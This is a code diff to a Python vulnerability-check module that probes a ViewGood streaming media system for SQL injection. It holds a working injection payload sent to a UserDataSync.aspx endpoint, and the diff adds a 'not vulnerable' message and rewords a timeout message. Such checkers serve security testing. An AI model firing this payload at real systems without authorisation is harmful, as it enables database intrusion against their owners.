@@ -29,7 +29,6 @@ class viewgood_two_sqli_BaseVerify:
             req = requests.get(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
                 cprint("[+]存在远古流媒体系统两处SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data), "red")
-
             vulnurl = self.url + "/VIEWGOOD/ADI/portal/UserDataSync.aspx"
             post_data = {
                 "UserGUID":"1'AnD(Db_Name()+ChAr(66)+ChAr(66)+ChAr(66)+@@VeRSioN)>0--"
@@ -37,9 +36,11 @@ class viewgood_two_sqli_BaseVerify:
             req = requests.get(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
                 cprint("[+]存在远古流媒体系统两处SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data), "red")
+            else:
+                cprint("[-]不存在viewgood_two_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
